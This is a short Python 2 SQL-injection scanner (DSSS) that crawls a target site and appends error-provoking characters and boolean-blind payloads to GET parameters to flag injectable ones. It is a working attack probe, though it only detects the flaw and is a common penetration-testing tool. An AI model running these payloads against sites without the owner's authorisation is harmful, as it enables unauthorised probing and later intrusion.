#!/usr/bin/env python

import difflib, httplib, optparse, random, re, urllib2, urlparse

NAME    = "Damn Small SQLi Scanner (DSSS) < 100 LOC (Lines of Code)"
VERSION = "0.1c"
AUTHOR  = "Miroslav Stampar (http://unconciousmind.blogspot.com | @stamparm)"
LICENSE = "GPLv2 (www.gnu.org/licenses/gpl-2.0.html)"
NOTE    = "This is a fully working PoC proving that commercial (SQLi) scanners can be beaten under 100 lines of code (blind, error, depth 1 crawler, comparisons: titles/fuzzy filtered text only/HTTP codes/page lengths)"

INVALID_SQL_CHAR_POOL = ['(', ')', '\'', '"']   # characters used for SQL poisoning of parameter values
PREFIXES = [" ", ") ", "' ", "') "]             # prefix values used for building testing blind payloads
SUFFIXES = ["", "-- ", "#"]                     # suffix values used for building testing blind payloads
BOOLEAN_TESTS = ["AND %d=%d", "OR NOT (%d=%d)"] # boolean tests used for building testing blind payloads
TEXT, HTTPCODE, TITLE, HTML = range(4)          # enumerator-like values used for marking content type
MIN_BOOL_VAL, MAX_BOOL_VAL = 100, 255           # minimum and maximum range values used in boolean tests
FUZZY_THRESHOLD = 0.95                          # value in range (0,1) for distinguishing True from False responses

DBMS_ERRORS = {
    "MySQL" : [r"SQL syntax.*MySQL", r"Warning.*mysql_.*", r"valid MySQL result", r"MySqlClient\."],\
    "PostgreSQL" : [r"PostgreSQL.*ERROr", r"Warning.*\Wpg_.*", r"valid PostgreSQL result", r"Npgsql\."],\
    "Microsoft SQL Server" : [r"Driver.* SQL[\-\_\ ]*Server", r"OLE DB.* SQL Server", r"(\W|\A)SQL Server.*Driver", r"Warning.*mssql_.*", r"(\W|\A)SQL Server.*[0-9a-fA-F]{8}", r"Exception Details:.*\WSystem\.Data\.SqlClient\.", r"Exception Details:.*\WRoadhouse\.Cms\."],\
    "Microsoft Access" : [r"Microsoft Access Driver", r"JET Database Engine", r"Access Database Engine"],\
    "Oracle" : [r"ORA-[0-9][0-9][0-9][0-9]", r"Oracle error", r"Oracle.*Driver", r"Warning.*\Woci_.*", r"Warning.*\Wora_.*"],\
    "IBM DB2" : [r"CLI Driver.*DB2", r"DB2 SQL error", r"db2_connect\(", r"db2_exec\(", r"db2_execute\(", r"db2_fetch_"],\
    "Informix" : [r"Exception.*Informix"],\
    "Firebird" : [r"Dynamic SQL Error", r"Warning.*ibase_.*"],\
    "SQLite" : [r"SQLite/JDBCDriver", r"SQLite.Exception", r"System.Data.SQLite.SQLiteException", r"Warning.*sqlite_.*", r"Warning.*SQLite3::"],\
    "SAP MaxDB" : [r"SQL error.*POS([0-9]+).*", r"Warning.*maxdb.*"],\
    "Sybase" : [r"Warning.*sybase.*", r"Sybase message", r"Sybase.*Server message.*"],\
    "Ingres" : [r"Warning.*ingres_", r"Ingres SQLSTATE", r"Ingres\W.*Driver"]
}

def retrieveContent(url):
    retVal = {HTTPCODE : httplib.OK}
    try:
        retVal[HTML] = urllib2.urlopen(url.replace(" ", "%20")).read() # replacing ' ' with %20 is a quick/dirty fix for urllib2
    except Exception, e:
        retVal[HTML] = e.read() if hasattr(e, "read") else ""
        retVal[HTML] = e.msg if hasattr(e, "msg") else retVal[HTML] or ""
        retVal[HTTPCODE] = e.code if hasattr(e, "code") else None
    match = re.search(r"<title>(?P<title>[^<]+)</title>", retVal[HTML], re.I)
    retVal[TITLE] = match.group("title") if match else ""
    retVal[TEXT] = re.sub(r"<script.+?</script>|<!--.+?-->|<style.+?</style>|<[^>]+>|\s", " ", retVal[HTML], re.I|re.M)
    retVal[TEXT] = re.sub(r"\s{2,}", " ", retVal[TEXT])
    return retVal

def shallowCrawl(url):
    retVal = set([url])
    page = retrieveContent(url)[HTML]
    for match in re.finditer(r"href\s*=\s*\"(?P<href>[^\"]+)\"", page, re.I):
        link = urlparse.urljoin(url, match.group("href"))
        if reduce(lambda x, y: x == y, map(lambda x: urlparse.urlparse(x).netloc.split(':')[0], [url, link])):
            retVal.add(link)
    return retVal

def scanPage(url):
    retVal = False
    for link in shallowCrawl(url):
        print "* scanning: %s%s" % (link, " (no GET parameters)" if '?' not in link else "")
        for match in re.finditer(r"(?:[?&;])((?P<parameter>\w+)=[^&;]+)", link):
            vulnerable = False
            tampered = link.replace(match.group(0), match.group(0) + "".join(random.sample(INVALID_SQL_CHAR_POOL, len(INVALID_SQL_CHAR_POOL))))
            content = retrieveContent(tampered)
            for dbms in DBMS_ERRORS:
                for regex in DBMS_ERRORS[dbms]:
                    if not vulnerable and re.search(regex, content[HTML], re.I):
                        print " (o) parameter '%s' could be error SQLi vulnerable! (%s error message)" % (match.group("parameter"), dbms)
                        retVal = vulnerable = True
            vulnerable = False
            original = retrieveContent(link)
            a, b = random.randint(MIN_BOOL_VAL, MAX_BOOL_VAL), random.randint(MIN_BOOL_VAL, MAX_BOOL_VAL)
            for prefix in PREFIXES:
                for boolean in BOOLEAN_TESTS:
                    for suffix in SUFFIXES:
                        if not vulnerable:
                            template = "%s%s%s" % (prefix, boolean, suffix)
                            payloads = dict([(x, link.replace(match.group(0), match.group(0) + (template % (a, a if x else b)))) for x in (True, False)])
                            contents = dict([(x, retrieveContent(payloads[x])) for x in (True, False)])
                            if any(map(lambda x: original[x] == contents[True][x] != contents[False][x], [HTTPCODE, TITLE])) or len(original[TEXT]) == len(contents[True][TEXT]) != len(contents[False][TEXT]):
                                vulnerable = True
                            else:
                                ratios = dict([(x, difflib.SequenceMatcher(None, original[TEXT], contents[x][TEXT]).quick_ratio()) for x in (True, False)])
                                vulnerable = ratios[True] > FUZZY_THRESHOLD and ratios[False] < FUZZY_THRESHOLD
                            if vulnerable:
                                print " (i) parameter '%s' appears to be blind SQLi vulnerable! (\"%s\")" % (match.group("parameter"), payloads[True])
                                retVal = True
    return retVal

if __name__ == "__main__":
    print "%s #v%s\n by: %s\n" % (NAME, VERSION, AUTHOR)
    parser = optparse.OptionParser(version=VERSION)
    parser.add_option("-u", "--url", dest="url", help="Target URL (e.g. \"http://www.target.com/page.htm?id=1\")")
    options, _ = parser.parse_args()
    if options.url:
        result = scanPage(options.url if options.url.startswith("http") else "http://%s" % options.url)
        print "\nscan results: %s vulnerabilities found" % ("possible" if result else "no")
    else:
        parser.print_help()
